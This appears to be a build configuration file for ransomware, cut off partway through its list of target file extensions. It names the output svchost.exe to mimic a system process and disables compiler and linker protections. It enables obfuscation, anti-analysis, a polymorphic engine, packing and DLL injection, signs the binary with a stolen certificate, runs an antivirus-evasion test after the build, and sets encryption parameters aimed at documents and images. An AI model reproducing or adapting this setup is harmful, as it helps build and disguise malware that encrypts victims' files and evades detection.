{
  "source_dir": "src",
  "output_dir": "release",
  "main_executable": "svchost.exe",
  "target_architecture": "x64",
  
  "compiler_flags": [
    "/O2", "/GL", "/MT", "/DNDEBUG", "/GS-", "/Gy", "/Gm-",
    "/EHsc", "/nologo", "/W0"
  ],
  
  "linker_flags": [
    "/SUBSYSTEM:WINDOWS", "/ENTRY:mainCRTStartup", "/LTCG",
    "/OPT:REF", "/OPT:ICF", "/MANIFEST:NO", "/NOLOGO",
    "/DYNAMICBASE:NO", "/NXCOMPAT:NO"
  ],
  
  "obfuscation_level": "maximum",
  "enable_anti_analysis": true,
  "pack_executable": true,
  "polymorphic_engine": true,
  "code_virtualization": true,
  
  "inject_dll": true,
  "dll_to_inject": "ntdll_hook.dll",
  
  "sign_binary": true,
  "signing_cert": "stolen_cert.pfx",
  "signing_password": "extracted_password",
  "timestamp_server": "http://timestamp.sectigo.com",
  
  "post_build_commands": [
    "upx --ultra-brute release/svchost.exe",
    "python3 add_digital_signature.py",
    "python3 test_av_evasion.py"
  ],
  
  "encryption": {
    "algorithm": "xchacha20poly1305",
    "key_derivation": "argon2id", 
    "iterations": 20,
    "memory": 131072,
    "parallelism": 8,
    "master_key_entropy": 256
  },
  
  "target_extensions": [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ai",
